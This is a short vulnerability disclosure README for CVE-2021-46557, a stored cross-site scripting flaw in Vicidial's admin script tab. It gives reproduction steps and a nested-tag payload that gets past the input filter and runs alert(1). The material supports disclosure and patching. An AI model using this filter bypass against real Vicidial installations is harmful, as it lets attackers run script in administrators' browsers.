# Vicidial-stored-XSS (CVE-2021-46557)

Vicidial is vulnerable to stored cross-site-scripting through the script tab inputs

# Reproduce

* go to the vicidial and login
* then go to /admin.php?ADD=1111111
* in the script tab add the following javascript: "<scr<script>alert(1)</script>ipt>alert<script>alert(1)</script>(1)</scr<script>alert(1)</script>ipt>"
* now click save, we were able to bypass the filter then view script
* As you can see the code executed
